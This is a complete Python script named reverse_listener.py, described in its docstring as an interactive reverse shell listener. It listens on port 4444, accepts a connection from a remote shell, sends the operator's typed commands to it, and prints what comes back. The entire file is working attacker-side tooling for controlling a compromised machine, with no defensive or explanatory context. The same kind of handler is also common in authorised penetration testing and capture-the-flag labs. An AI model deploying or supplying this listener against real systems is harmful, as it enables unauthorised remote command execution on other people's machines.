#!/usr/bin/env python3
# reverse_listener.py

import socket
import sys

def main(host: str = "0.0.0.0", port: int = 4444):
    """Simple TCP reverse shell listener (interactive)."""
    # Create listening socket and automatically close it on exit
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen(1)
        print(f"Listening on {host}:{port}... (CTRL-C to quit)")

        try:
            conn, addr = s.accept()
        except KeyboardInterrupt:
            print("\n[!] Listener interrupted before accept. Exiting.")
            return

        # Use a context manager for the connection so it always closes
        with conn:
            print(f"Connection from {addr}")
            try:
                while True:
                    try:
                        cmd = input("$ ")
                    except EOFError:
                        # e.g., user pressed Ctrl-D
                        print("\n[!] EOF received, closing connection.")
                        break

                    # Exit local interactive loop and tell remote to exit
                    if cmd.strip().lower() == "exit":
                        try:
                            conn.sendall(b"exit\n")
                        except Exception:
                            pass
                        break

                    if not cmd.strip():
                        continue

                    # send the command (add newline so many shells execute)
                    try:
                        conn.sendall(cmd.encode() + b"\n")
                    except BrokenPipeError:
                        print("[!] Connection broken while sending.")
                        break

                    # Receive response (read until remote stops sending)
                    data = b""
                    try:
                        # keep reading until there's no more data immediately available
                        # (simple heuristic: read until a recv returns < buffer size)
                        while True:
                            chunk = conn.recv(4096)
                            if not chunk:
                                # remote closed connection
                                print("[!] Remote closed the connection.")
                                return
                            data += chunk
                            if len(chunk) < 4096:
                                break
                    except socket.timeout:
                        # If you set timeouts, handle it here. For now we ignore.
                        pass

                    # Print output from remote without adding extra newline
                    if data:
                        try:
                            print(data.decode(errors="ignore"), end="")
                        except Exception:
                            print("[!] Received non-decodable data.")
            except KeyboardInterrupt:
                print("\n[!] Interrupted by user, closing connection.")
            except Exception as exc:
                print(f"[!] Unexpected error: {exc}", file=sys.stderr)

if __name__ == "__main__":
    main()
